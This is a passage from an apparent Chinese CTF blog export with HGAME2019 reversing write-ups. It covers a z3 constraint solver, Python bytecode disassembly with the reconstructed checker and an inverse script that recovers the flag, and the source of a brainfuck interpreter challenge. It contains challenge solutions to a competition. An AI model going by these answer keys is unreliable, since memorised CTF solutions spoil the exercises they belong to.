19 * v34[23] + 98 * v34[9] + 15 * v34[16] + 49 * v34[1] == 128223)solver.add(13 * v34[14] + 73 * v34[19] + 99 * v34[7] + 76 * v34[12] + 84 * v34[25] + 91 * v34[10] + 67 * v34[22] + 77 * v34[15] + 23 * v34[26] + 38 * v34[4] + 3 * v34[31] + 76 * v34[13] + 50 * v34[0] + 74 * v34[11] + 45 * v34[28] + 58 * v34[29] + 39 * v34[5] + 95 * v34[9] + 26 * v34[16] + 23 * v34[8] + 28 * v34[24] + 89 * v34[1] + 88 * v34[18] + 3 * v34[3] + 59 * v34[20] + 80 * v34[23] + 49 * v34[17] + 56 * v34[21] + 32 * v34[27] + 24 * v34[2] + 77 * v34[30] + 18 * v34[6] == 138403)if solver.check() == sat: m = solver.model() s=[] for i in range(32): s.append(m[v34[i]].as_long())print &apos;&apos;.join([chr(i) for i in s]) 没带鼠标回家拖数据好累s","categories":[],"tags":[]},{"title":"HGAME2019-python-bytecode","slug":"HGAME2019-python-bytecode","date":"2019-02-06T09:32:22.000Z","updated":"2019-02-20T15:14:53.205Z","comments":true,"path":"2019/02/06/HGAME2019-python-bytecode/","link":"","permalink":"http://yoursite.com/2019/02/06/HGAME2019-python-bytecode/","excerpt":"题目给了一个pyc文件，但是不能用uncompyle2反编译成py文件。很难受，给了hint：bytecode。网上🏄发现了python自带的dis模块，可以解析一下pyc文件。","text":"题目给了一个pyc文件，但是不能用uncompyle2反编译成py文件。很难受，给了hint：bytecode。网上🏄发现了python自带的dis模块，可以解析一下pyc文件。 1234567import disimport marshalf=open(&quot;1.pyc&quot;,&apos;rb&apos;)magic=f.read(4)mtime=f.read(4)code=marshal.load(f)dis.dis(code) 然而什么都不做直接使用dis会出现： 123456789101112131415 2 0 JUMP_ABSOLUTE 3 &gt;&gt; 3 JUMP_ABSOLUTE 9 6 LOAD_CONST 15 (&quot;You&apos;re Wrong! &quot;) &gt;&gt; 9 JUMP_ABSOLUTE 14 3 12 PRINT_ITEM 13 LOAD_CONST 100Traceback (most recent call last): File &quot;2.py&quot;, line 6, in &lt;module&gt; dis.dis(code) File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/dis.py&quot;, line 43, in dis disassemble(x) File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/dis.py&quot;, line 95, in disassemble print &apos;(&apos; + repr(co.co_consts[oparg]) + &apos;)&apos;,IndexError: tuple index out of range 继续网上🏄，了解到结合上下文修改出错的地方的字节码就OK了。没有头绪地弄了半天，最终改掉了LOAD_CONST 100中的100，十六进制表示为0x64，改成00就可以先凑合看着了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128 2 0 JUMP_ABSOLUTE 3 &gt;&gt; 3 JUMP_ABSOLUTE 9 6 LOAD_CONST 15 (&quot;You&apos;re Wrong! &quot;) &gt;&gt; 9 JUMP_ABSOLUTE 14 3 12 PRINT_ITEM 13 PRINT_NEWLINE &gt;&gt; 14 LOAD_CONST 0 (-1) 17 LOAD_CONST 1 (None) 20 IMPORT_NAME 0 (string) 23 STORE_NAME 0 (string) 26 LOAD_NAME 1 (list) 29 LOAD_NAME 0 (string) 32 LOAD_ATTR 2 (letters) 35 CALL_FUNCTION 1 38 LOAD_NAME 1 (list) 41 LOAD_NAME 0 (string) 44 LOAD_ATTR 3 (digits) 47 CALL_FUNCTION 1 5 50 BINARY_ADD 51 LOAD_CONST 2 (&apos;+&apos;) 54 LOAD_CONST 3 (&apos;/&apos;) 57 BUILD_LIST 2 60 BINARY_ADD 61 STORE_NAME 2 (letters) 64 LOAD_CONST 4 (&apos;FcjTCgD1EffEm2rPC3bTyL5Wu2bKBI9KAZrwFgrUygHN&apos;) 67 STORE_NAME 4 (dec)35 70 LOAD_CONST 5 (&lt;code object encode at 0x101a328b0, file &quot;third.py&quot;, line 7&gt;) 73 MAKE_FUNCTION 0 76 STORE_NAME 5 (encode) 79 LOAD_CONST 6 (&quot;Welcome to Processor&apos;s Python Classroom Part 3&amp;4!\\n&quot;) 82 PRINT_ITEM 83 PRINT_NEWLINE 84 LOAD_CONST 7 (&apos;qi shi wo jiu shi lan cai ba liang dao ti fang zai yi qi.&apos;) 87 PRINT_ITEM 88 PRINT_NEWLINE 89 LOAD_CONST 8 (&quot;Now let&apos;s start the origin of Python!\\n&quot;) 92 PRINT_ITEM 93 PRINT_NEWLINE 40 94 LOAD_CONST 9 (&apos;Plz Input Your Flag:\\n&apos;) 97 PRINT_ITEM 98 PRINT_NEWLINE 99 LOAD_NAME 6 (raw_input) 102 CALL_FUNCTION 0 105 STORE_NAME 7 (enc) 108 LOAD_NAME 1 (list) 111 LOAD_NAME 7 (enc) 114 CALL_FUNCTION 1 117 STORE_NAME 8 (lst) 120 LOAD_NAME 8 (lst) 123 LOAD_ATTR 9 (reverse) 126 CALL_FUNCTION 0 129 POP_TOP 130 LOAD_NAME 10 (len) 133 LOAD_NAME 8 (lst) 136 CALL_FUNCTION 1 139 STORE_NAME 11 (llen) 142 SETUP_LOOP 99 (to 244) 145 LOAD_NAME 12 (range) 148 LOAD_NAME 11 (llen) 151 CALL_FUNCTION 1 154 GET_ITER 155 FOR_ITER 85 (to 243) 158 STORE_NAME 13 (i) 161 LOAD_NAME 13 (i) 164 LOAD_CONST 10 (2) 167 BINARY_MODULO 168 LOAD_CONST 11 (0) 171 COMPARE_OP 2 (==) 174 POP_JUMP_IF_FALSE 196 177 LOAD_NAME 14 (chr) 180 LOAD_NAME 15 (ord) 183 LOAD_NAME 8 (lst) 186 LOAD_NAME 13 (i) 189 BINARY_SUBSCR 190 CALL_FUNCTION 1 193 LOAD_CONST 10 (2)46 &gt;&gt; 196 BINARY_SUBTRACT 197 CALL_FUNCTION 1 200 LOAD_NAME 8 (lst) 203 LOAD_NAME 13 (i) 206 STORE_SUBSCR 207 JUMP_FORWARD 0 (to 210) &gt;&gt; 210 LOAD_NAME 14 (chr) 213 LOAD_NAME 15 (ord) 216 LOAD_NAME 8 (lst) 219 LOAD_NAME 13 (i) 222 BINARY_SUBSCR 223 CALL_FUNCTION 1 226 LOAD_CONST 12 (1) 229 BINARY_ADD 48 230 CALL_FUNCTION 1 233 LOAD_NAME 8 (lst)49 236 LOAD_NAME 13 (i) 239 STORE_SUBSCR 240 JUMP_ABSOLUTE 141 &gt;&gt; 243 POP_BLOCK &gt;&gt; 244 LOAD_CONST 13 (&apos;&apos;) 247 STORE_NAME 16 (enc2) 250 LOAD_NAME 16 (enc2) 253 LOAD_ATTR 17 (join) 256 LOAD_NAME 8 (lst) 259 CALL_FUNCTION 1 262 STORE_NAME 16 (enc2) 265 LOAD_NAME 5 (encode) 268 LOAD_NAME 16 (enc2) 271 CALL_FUNCTION 1 274 STORE_NAME 18 (enc3) 277 LOAD_NAME 18 (enc3) 280 LOAD_NAME 4 (dec)55 &gt;&gt; 283 COMPARE_OP 2 (==) 286 POP_JUMP_IF_FALSE 283 289 LOAD_CONST 14 (&quot;You&apos;re right! &quot;) 292 PRINT_ITEM 293 PRINT_NEWLINE 294 JUMP_FORWARD 5 (to 302) 297 LOAD_CONST 15 (&quot;You&apos;re Wrong! &quot;) 300 PRINT_ITEM 301 PRINT_NEWLINE &gt;&gt; 302 LOAD_CONST 1 (None) 305 RETURN_VALUE 还是比较好看的，只是一开始把MAKE_FUNCTION 0当成了定义一个无参函数，造成了很多不必要的麻烦。后来通过自己写py然后编译pyc然后用dis看的方法，大致是还原出了py源码。 12345678910111213141516171819202122import stringletters=list(string.letters)+list(string.digits)+[&apos;+&apos;,&apos;/&apos;]dec=&quot;FcjTCgD1EffEm2rPC3bTyL5Wu2bKBI9KAZrwFgrUygHN&quot;def encode(str): &apos;换表base64&apos; return strenc=raw_input()lst=list(enc)lst.reverse()for i in range(len(lst)): if i % 2 == 0: lst[i]=chr(ord(lst[i])-1) continue lst[i]=chr(ord(lst[i])+1)enc2=&apos;&apos;enc2=enc2.join(lst)enc3=encode(enc2)if enc3==dec: print &quot;You&apos;re right! &quot;else: print &quot;You&apos;re Wrong! &quot;print letters 虽然定义的函数的内容dis模块是不会解析出来的，但是看见熟悉的string.letters+string.digits+&#39;+&#39;+&#39;/&#39;，我不经意间想起了base64，只是换了个表而已。dec字符串中的大小写互换，然后base64解密，之后通过逆运算得到flag。 逆运算脚本(换表base64就不自己手写了）： 123456789dec=&apos;|&quot;mpguxQ^3dispmb^pS`dn/dk4V|dn`hg&apos;lst=list(dec)for i in range(len(lst)): if i % 2 == 0: lst[i]=chr(ord(lst[i])+1) if i % 2 == 1: lst[i]=chr(ord(lst[i])-1)lst.reverse()print &apos;&apos;.join(lst)","categories":[],"tags":[]},{"title":"HGAME2019-brainfxxker's revenge","slug":"brainfxxker-s-revenge","date":"2019-02-05T08:36:27.000Z","updated":"2019-02-16T14:22:34.994Z","comments":true,"path":"2019/02/05/brainfxxker-s-revenge/","link":"","permalink":"http://yoursite.com/2019/02/05/brainfxxker-s-revenge/","excerpt":"题目来自于HGAME2019，之前一直放着没做，结果发现第一周的题目现在做已经没分了23333","text":"题目来自于HGAME2019，之前一直放着没做，结果发现第一周的题目现在做已经没分了23333 源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314#include &lt;iostream&gt;#include &lt;cctype&gt;#include &lt;string&gt;// the description of this challenge is totally useless 2333333// oyiadin, Jan 29, 2019// have fun XDnamespace bf &#123; class Parser &#123; public: Parser() = default; ~Parser() = default; void execute(const std::string &amp;buf); protected: uint8_t data[1000] = &#123;0&#125;; uint8_t *ptr = data;&#125;;void Parser::execute(const std::string &amp;buf) &#123; unsigned unmatched; for (auto i = buf.cbegin(); i != buf.cend(); ++i) &#123; switch (*i) &#123; case &apos;&gt;&apos;: ++ptr; break; case &apos;&lt;&apos;: --ptr; break; case &apos;+&apos;: ++*ptr; break; case &apos;-&apos;: --*ptr; break; case &apos;.&apos;: putchar(*ptr); break; case &apos;,&apos;: while ((*ptr = getchar()) == &apos;\\n&apos;) ; break; case &apos;[&apos;: if (*ptr == 0) &#123; unmatched = 1; while (unmatched) &#123; while (++i != buf.cend()) &#123; if (*i == &apos;[&apos;) &#123; ++unmatched; break; &#125; else if (*i == &apos;]&apos;) &#123; --unmatched; break; &#125; &#125; &#125; &#125; break; case &apos;]&apos;: if (*ptr != 0) &#123; unmatched = 1; while (unmatched) &#123; while (i-- != buf.cbegin()) &#123; if (*i == &apos;[&apos;) &#123; --unmatched; break; &#125; else if (*i == &apos;]&apos;) &#123; ++unmatched; break; &#125; &#125; &#125; &#125; break; default: putchar(*i); &#125; &#125;&#125;&#125;int main() &#123; bf::Parser parser; parser.execute( &quot;+-&gt;,&lt;&gt;-+&lt;&gt;&gt;+-+-+&gt;&lt;+-+&lt;&gt;+-&gt;&lt;+-+&lt;&gt;+-+&lt;&gt;&lt;&gt;+&gt;&lt;[&lt;&gt;&lt;--+&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;-&lt;&gt;&lt;&gt;+-&gt;&lt;-&lt;&gt;&gt;&lt;-+-+--+-&lt;&gt;&gt;&lt;-+&lt;&gt;&lt;&gt;-----&gt;&quot; &quot;&lt;&lt;&gt;&gt;&lt;+-&lt;&gt;--+--+&gt;&lt;+--+-&gt;&lt;-+-+-+-&gt;&lt;&lt;&gt;--+-+-+-&lt;&gt;-+--+-+-&lt;&gt;&lt;&gt;+-&lt;&gt;-+-&gt;&gt;&lt;-+-]&gt;&lt;&gt;&lt;-+&lt;&gt;+-&lt;-+---+&gt;&lt;-&lt;&gt;-+-&lt;&gt;[+&quot; &quot;-&lt;-+&gt;&lt;&gt;&lt;++--+-++-&gt;-+&lt;&gt;[+-+-&lt;&gt;--++-&gt;&lt;+-][.&gt;&gt;[&lt;-,[[+[-&lt;.[--+]-,+]&gt;&lt;.[&lt;,[[&lt;,--[,&gt;[,&lt;+,.,]&lt;&gt;]+]&lt;.-].[&gt;[-&quot; &quot;.,.,[&gt;&lt;&lt;[&lt;-[&gt;.&lt;,.+&lt;]-..].,.[&lt;&gt;+[+][.+-,.&gt;,-+]]-]-.]+&gt;,]]&gt;]&gt;,.&gt;][&lt;,[&lt;[&lt;-&gt;[-.-.-]-]&lt;&lt;[.+[[&gt;,-[&lt;.&lt;[&gt;-&lt;.&quot; &quot;+-&lt;]+&lt;]&lt;,[&lt;..+],&gt;+]+,]&lt;--]-.]+..[.&lt;-[,&lt;[&lt;&gt;.[,&lt;[,&gt;&lt;,.]&lt;&lt;+].[--[-..&gt;[-&lt;..]&lt;-]+.]+--]-&lt;&lt;&gt;,&lt;]&gt;&lt;&gt;&lt;-]-.&gt;]&lt;&quot; &quot;&gt;,]-&lt;]&gt;&lt;&gt;&lt;&gt;&lt;+-&gt;&lt;][.-.[,[,+&gt;,&gt;][++[+[.[&gt;[&lt;&lt;&gt;,].&lt;&gt;]-[&gt;,],,]+,[.--[+,-,-]+,+]-&lt;&lt;].-+]]]+-&lt;&gt;&lt;&gt;&gt;&lt;-+,&lt;&gt;+-&gt;&quot; &quot;&lt;&gt;&lt;-+&gt;+-+--++-+&gt;&lt;-+&lt;&gt;+-++--++-&gt;&lt;-++&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;+&gt;&lt;++-&lt;&gt;&gt;&lt;-+[&lt;&gt;&lt;-++--&gt;&lt;-+-+-&lt;&gt;&gt;&lt;+-&gt;&lt;-&gt;&lt;+---++---+-+-+&lt;&gt;-+&quot; &quot;-&lt;&gt;+--+&lt;&gt;+--+--&lt;&gt;-+&gt;&lt;--+-++--&gt;&lt;-+--+-&lt;&gt;-&gt;&lt;-&gt;&lt;&lt;&gt;-&gt;&lt;&lt;&gt;+-&gt;&lt;-&gt;&lt;&gt;&lt;-&gt;&lt;&lt;&gt;+-+--+-+--+&lt;&gt;-&gt;&lt;-+&gt;&lt;-+&gt;&lt;--+-++-&lt;&gt;&gt;&quot; &quot;-&lt;&gt;+--+]&lt;&gt;&gt;&lt;&lt;&gt;&lt;&lt;&gt;-++-&gt;&lt;-&lt;&gt;&lt;&gt;+-+-&lt;&gt;-&gt;&lt;&gt;&lt;-+--+&gt;&lt;&gt;&lt;+-&lt;&gt;[&gt;&lt;+--+&lt;+-+-+-+&gt;&lt;&gt;[&gt;&lt;-+--++-&lt;&gt;][.-+[&gt;&gt;+[&lt;&lt;,&lt;.&gt;[+&quot; &quot;&lt;&lt;&gt;.]+]-+&lt;[.&lt;.+[,[.&gt;&lt;,.+]+-..+]&gt;,-]-]&gt;--]&lt;&gt;]-++--++-,&gt;&lt;+-&gt;&lt;&gt;&gt;&lt;&gt;&lt;+&gt;&lt;-+-+-++&gt;&lt;&lt;&gt;&lt;&gt;+-+&lt;&gt;&lt;&gt;+-+&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+&gt;&quot; &quot;&lt;&gt;&lt;-+[&gt;&lt;-+&lt;&gt;-+&lt;+---&gt;&lt;-+-+&lt;&gt;-+--+-+-+--+-+-&lt;&gt;-++-&gt;&lt;---+&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;-&lt;&gt;+---+-+----+-&lt;&gt;&lt;&gt;-+-+--+-+-&lt;&gt;-&gt;&lt;-+&gt;&quot; &quot;&lt;&gt;&lt;-&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;--+&gt;&lt;--+-+&gt;+--&gt;&lt;&gt;&lt;&gt;&lt;+--+]+-+-&lt;&gt;&lt;-+&lt;&gt;+--+-&lt;&gt;-[&lt;&gt;&lt;&gt;&lt;-++-+&gt;&lt;&lt;&gt;&gt;&gt;&lt;-+&lt;&gt;&gt;&lt;&gt;&lt;[&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;-+-&gt;&lt;&gt;&lt;+-&quot; &quot;&lt;&gt;+-][,&gt;&gt;]+-&gt;&lt;-+-+&gt;&lt;],+-&gt;&lt;-++-&gt;-+&gt;&lt;+-++-+&gt;&lt;&lt;&gt;+++&gt;&lt;&gt;&lt;&gt;&lt;++-+[-+-+&gt;&lt;&lt;&gt;&lt;&lt;&gt;-&gt;&lt;&lt;&gt;-+-+-&gt;&lt;&lt;&gt;-++-&gt;&lt;-&lt;&gt;-+-+-+-&quot; &quot;+-&gt;&lt;-+--+-+-+-&lt;&gt;-+-&lt;&gt;+--+-&lt;&gt;&lt;&gt;+-+--+-+-+-&lt;&gt;--+&lt;&gt;--++-&lt;&gt;-+---+&lt;&gt;-&gt;&lt;&lt;&gt;-+-&gt;&gt;&lt;-&lt;&gt;][-[.&gt;[,,&lt;[.,.[,[&gt;[.,-+&quot; &quot;+].-][&lt;.[&gt;[,&lt;[&lt;&gt;+]&gt;[-+-[.&lt;&lt;+.-]-[&gt;]&gt;&lt;,]+][[+&gt;-+[&lt;,&lt;]]]++]++++]][-++[&lt;[&gt;+.,-]-,+]&lt;]].+]-,++].-,]+-&gt;&lt;-&quot; &quot;+&lt;&gt;+-&lt;-+-+&gt;&lt;-+-&lt;&gt;+---+-+&lt;&gt;-+-&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&lt;&gt;-[&gt;&lt;&gt;&lt;+-&lt;&gt;&lt;+-+-+&gt;&lt;&gt;[-&lt;&gt;-+]-+],&gt;&lt;&lt;&gt;+-&gt;&lt;&gt;&lt;&gt;&lt;&gt;+&lt;&gt;-++-&lt;&gt;+-+&lt;&gt;++&lt;&gt;&quot; &quot;++-&lt;&gt;&gt;&lt;+&gt;&lt;&lt;&gt;+-+-&gt;&lt;++-&lt;&gt;+-+++-+-&lt;&gt;&gt;&lt;+-[&gt;&lt;&lt;&gt;+-&lt;&gt;&lt;--+-+-&gt;&lt;&lt;&gt;-+-+-&lt;&gt;+--&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;-&lt;&gt;&lt;&gt;-+-+--&lt;&gt;-+-&lt;&gt;-+--+-&lt;&quot; &quot;&gt;-&gt;&lt;&lt;&gt;&gt;+-&lt;&gt;+-+--+-&lt;&gt;&gt;&lt;][&gt;&lt;+-[&gt;[&gt;[+.[.[-&gt;&lt;[&gt;&lt;[,,++.[&lt;-[.+,&lt;]&lt;.&lt;]&gt;]]&gt;-,,].,]+&lt;]-,,&lt;][+.&gt;].],+]&lt;&gt;&lt;+-&gt;&lt;&lt;&quot; &quot;&gt;-&lt;&gt;&lt;&gt;--+&gt;&lt;[+-&lt;&lt;&gt;&gt;&lt;&lt;&gt;+-++-&gt;&lt;&gt;-+&lt;&gt;[+--+-]&lt;&gt;&lt;&gt;+-&lt;&gt;&gt;&lt;]-++-,&gt;-+-++-++-+-&gt;&lt;+&gt;&lt;+-+&gt;&lt;-+&gt;&lt;++--+&gt;&lt;&lt;&gt;+&lt;&gt;&gt;&lt;-++-&quot; &quot;&gt;&lt;+&gt;&lt;+&lt;&gt;-+&gt;&lt;-++-++--++-&gt;&lt;[-+&lt;-+-&gt;&lt;--+&gt;&lt;--+-+-++--&gt;&lt;-&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;&gt;&lt;-+--++--+-&lt;&gt;&gt;&lt;-&gt;&lt;&gt;&lt;-++--&lt;&gt;&gt;&lt;-+-++---&lt;&quot; &quot;&gt;+--+---+&gt;&lt;-+&lt;&gt;-&lt;&gt;&gt;-++--+-+-+-&gt;&lt;][..,,]&gt;&lt;&lt;&gt;-+-+&lt;&gt;&lt;+-+-&lt;&gt;+--&gt;&lt;&lt;&gt;--+-++-+--+--+&lt;&gt;&lt;&gt;+-[-+-+&gt;&lt;&gt;&lt;&lt;-+-+-++&quot; &quot;-++--++-&lt;&gt;&gt;[-]+-&gt;&lt;&gt;&lt;-+&lt;&gt;][&gt;]&gt;&lt;&gt;&lt;&gt;&lt;+--+,+-&gt;&lt;&lt;&gt;&gt;+-+-+-&gt;&lt;+&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;+-+-+&lt;&gt;&lt;&gt;-++&gt;&lt;+-++--++--+++&gt;&lt;&lt;&gt;++-+-&lt;&quot; &quot;&gt;-+++--+&lt;&gt;-++-[-+&lt;-+-&gt;&lt;&gt;&lt;-+-+--&gt;&lt;+-+--&gt;&lt;&lt;&gt;&gt;&lt;-+-&gt;&lt;--+&lt;&gt;-+&lt;&gt;-&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;-+-&gt;&lt;-+--+-+-&gt;&lt;+---+&lt;&gt;-&gt;&lt;-+&gt;&lt;&gt;-++&quot; &quot;-+--+&lt;&gt;--++-+-+--+][-+&gt;&gt;-]&lt;--&lt;&gt;--&lt;&gt;&lt;&gt;--+&gt;&lt;[&gt;&lt;&gt;&lt;-+-+&lt;++-&lt;&gt;&lt;&gt;&gt;&lt;&gt;[-+-+&lt;&gt;+--+-&lt;&gt;+-&lt;&gt;-+][[[--.[-.-&gt;[&lt;,.,[&quot; &quot;++&gt;&lt;&lt;&gt;&gt;&lt;&gt;]]&lt;]-.[.,[.&lt;&gt;]&gt;[&lt;&lt;&gt;[[&gt;&gt;-]+-[&gt;-.[,+&lt;&lt;[[--,&lt;&gt;+,],&gt;[-&gt;-].,+]++&lt;]&lt;[-.[[+,&gt;&lt;+&lt;]&gt;[-&lt;.&gt;&lt;+]&gt;&gt;],[-,[&quot; &quot;&lt;]+&lt;]&lt;.]]--+].]]],++]-&gt;[.-[,[-.&lt;&lt;.,].-[,-[,++]+,]]&gt;-&lt;]--&gt;]+-&gt;&lt;&gt;&lt;],+-&gt;&lt;&gt;-++++-+-++--+-++-++-+&lt;&gt;&lt;&gt;+&lt;&gt;&gt;&quot; &quot;&lt;+--++-++&gt;&lt;+--+++-&gt;&lt;+--+&gt;&lt;[-+&lt;&gt;&gt;&lt;-+&lt;+--+&lt;&gt;&lt;&gt;&gt;&lt;-+-+-+--+&lt;&gt;--+--+-+--++-&gt;&lt;&gt;&lt;-&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;+--]+-&gt;&lt;+-&lt;--+&gt;&lt;&quot; &quot;&lt;&gt;&gt;&lt;&lt;&gt;-+--+-+-+-+---++---+-&gt;&lt;+-[+-&gt;&lt;&lt;&gt;&lt;+-&gt;&lt;+-+&lt;&gt;-+&lt;&gt;+-+-&gt;[&gt;&lt;-+-&gt;&lt;&gt;&lt;][[&lt;&lt;[,-.[&lt;+,-+&lt;]&gt;+],&lt;-,]+.++,.]&lt;&quot; &quot;&gt;&gt;&lt;&gt;&lt;&gt;&lt;]-+&gt;&lt;,&gt;&lt;&gt;&gt;&lt;&gt;&lt;+-+-+-+&gt;&lt;+-&lt;&gt;&gt;&lt;++--+&lt;&gt;+-+-+&lt;&gt;+-+-+&lt;&gt;+-+&gt;&lt;+&gt;&lt;&gt;&lt;&gt;&lt;&lt;&gt;[&lt;&gt;-+&lt;&gt;&lt;+-&lt;&gt;+---+&gt;&lt;--+--+-&gt;&lt;&gt;&lt;&quot; &quot;--+-&lt;&gt;-++--+-&lt;&gt;+-+--&lt;&gt;&gt;&gt;&lt;&lt;&gt;+--+&lt;&gt;-]&gt;&lt;&lt;&lt;&gt;&lt;&gt;&lt;&gt;+---&gt;&lt;+-&gt;&lt;&gt;&lt;-+-&gt;&lt;-+-&gt;&lt;-++-&lt;&gt;+--[+-&gt;&lt;+-&lt;&lt;&gt;+&gt;&lt;&gt;&lt;&gt;[-&lt;&gt;&gt;&lt;]]&gt;&quot; &quot;&lt;&gt;&lt;&lt;&gt;&lt;&gt;-+,&gt;&lt;-+&gt;+-&gt;&lt;+-+&lt;&gt;-+++-+-&lt;&gt;+-++-+&gt;&lt;&gt;&lt;+&gt;&lt;+[&lt;-&gt;&lt;&gt;&lt;-+---+&gt;&lt;&gt;&lt;-&lt;&gt;+-&gt;&lt;+-&lt;&gt;-+-&gt;&lt;-+-+--+&lt;&gt;&lt;&gt;-+--&lt;&gt;-++&quot; &quot;-+-&gt;&lt;-&lt;&gt;&lt;&gt;&gt;&lt;-+-&gt;&lt;&lt;&gt;--++-&gt;&lt;&lt;&gt;-&gt;&lt;+-+--&gt;&lt;--+&gt;&lt;+---+&gt;&lt;-+&gt;&lt;-&gt;&gt;&lt;+-+--+-+-]-+&gt;&lt;&lt;-+-++-&lt;&gt;&gt;&lt;-[&gt;&lt;+-&lt;+--++-&gt;&lt;++&quot; &quot;-+-&gt;&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;[&gt;&lt;+--+&lt;&gt;-+--+&gt;&lt;&lt;&gt;][,&lt;+,]]+-&lt;&gt;,+-&gt;&lt;+-+-&gt;-+-+&lt;&gt;&lt;&gt;&lt;&gt;++&lt;&gt;++-&lt;&gt;&gt;&lt;+--+++&lt;&gt;&gt;&lt;-++-+-++--++&lt;&gt;&gt;&lt;-&quot; &quot;+-+-+++-&gt;&lt;-++&gt;&lt;+-&gt;&lt;+-[&lt;--+&lt;&gt;-+-&gt;&lt;+--&lt;&gt;--+-+-+--+&lt;&gt;-&gt;&lt;+-&gt;&lt;-+-&gt;&lt;--+--++-&gt;&lt;&gt;&lt;-&lt;&gt;&lt;&gt;-+&gt;&lt;-&gt;+-&gt;&lt;&lt;&gt;&gt;&lt;-+--+&gt;&lt;&quot; &quot;][--+&gt;]&lt;&gt;+-&lt;&gt;&lt;&lt;&gt;&lt;&gt;-+-+-+-&lt;&gt;-&lt;&gt;-+-+[-+&gt;&lt;&gt;&lt;&gt;&lt;&lt;&lt;&gt;-+-+-+++-&lt;&gt;&lt;&gt;+-+-&gt;+-&gt;&lt;[&lt;&gt;+-+--+-&gt;&lt;+-&lt;&gt;]-+-+&gt;&lt;&gt;&lt;]+-,&gt;+-&quot; &quot;&gt;&lt;+&lt;&gt;+&gt;&lt;+-+&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;+-+&lt;&gt;&lt;&gt;+&lt;&gt;&lt;&gt;+&gt;&lt;+-&gt;&lt;-+[&lt;&gt;&lt;-++--++---+&lt;&gt;-&lt;&gt;-&gt;&lt;-++-&lt;&gt;--++-+-&gt;&lt;+---&lt;&gt;-+-+-&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+&quot; &quot;--&gt;&lt;+-+-&gt;&lt;-+&gt;-+&gt;&lt;&lt;&gt;&lt;&gt;&lt;&gt;-+-+--+&gt;&lt;]&lt;-[&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&lt;&gt;&lt;&lt;&gt;-+&gt;&lt;+-+&gt;[&gt;&lt;-&lt;&gt;&lt;&gt;+-][&lt;--+.[&lt;[[.,[...],],.]&gt;,&lt;-.]]]+-&quot; &quot;,+-&gt;+&gt;&lt;-+++&gt;&lt;+-+-&gt;&lt;+&lt;&gt;-+-+++-+&gt;&lt;+-+&gt;&lt;&lt;&gt;[-+&lt;&gt;&lt;&gt;&lt;&lt;&gt;-+&gt;&lt;&lt;&gt;--+&lt;&gt;&lt;&gt;+-----+&lt;&gt;&lt;&gt;-&lt;&gt;&gt;&lt;-+-&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;-&lt;&gt;&gt;-+-+-+-&quot; &quot;+-&gt;&lt;+--+-+]+-&lt;&lt;&gt;+-&gt;&lt;-&gt;&lt;-+-++-[-+&gt;&lt;&lt;-++--+++-+-+--+&gt;&gt;&lt;+-&gt;&lt;+-[&gt;&lt;+-&gt;&lt;+-&lt;&gt;--+&lt;&gt;&lt;&gt;+-]&gt;&lt;&lt;&gt;&gt;&lt;][&gt;,,-]-+&lt;&gt;&lt;&gt;&lt;&quot; &quot;&gt;,&lt;&gt;&gt;&lt;-+&lt;&gt;&gt;&lt;&gt;&lt;&gt;-+-+&gt;&lt;+&gt;&lt;+-++-++-+-&lt;&gt;&lt;&gt;&lt;&gt;+&lt;&gt;&gt;&lt;-+&lt;&gt;&lt;&gt;++-&lt;&gt;+-&gt;&lt;+&lt;&gt;-++[&gt;&lt;&lt;&gt;&lt;&lt;&gt;-&lt;&gt;&lt;&gt;-++-&gt;&lt;-&gt;&lt;-&lt;&gt;+----+--&lt;&quot; &quot;&gt;-+-++-&lt;&gt;&gt;&gt;&lt;-&lt;&gt;-++-&gt;&lt;&lt;&gt;][&gt;&gt;[-&gt;[,&lt;&lt;]],.[&lt;+.[,-.[,[+[-[&lt;&gt;&gt;,.[-+[&gt;.&gt;&lt;[.&lt;.,&lt;&gt;.]].-],]&gt;..&lt;&lt;]]&lt;.,]&lt;++&gt;]-+.&quot; &quot;+&gt;]]+-&lt;&gt;&lt;[+--+&gt;&lt;&lt;&gt;-+&lt;+-+&lt;&gt;&lt;&gt;-+&lt;&gt;&gt;-++-&gt;&lt;+--+[-+--++-][[.-[+[.&gt;&gt;[,-&gt;-]&gt;[[.-&lt;..&lt;[.,[.+[-+,[.&lt;,&gt;].,,[&lt;.&gt;&quot; &quot;+-&lt;.]-+&gt;]..]&lt;-+.++].]]&lt;]+],&gt;]-..+-]+-]&lt;&gt;,-++-+-&gt;&lt;+-&gt;&gt;&lt;&lt;&gt;+&gt;&lt;+-&lt;&gt;+-++-+-+&gt;&lt;+-+&gt;&lt;&lt;&gt;+&lt;&gt;[&gt;&lt;&lt;&gt;+-&lt;&gt;&lt;&gt;&lt;+-&gt;&lt;&lt;&quot; 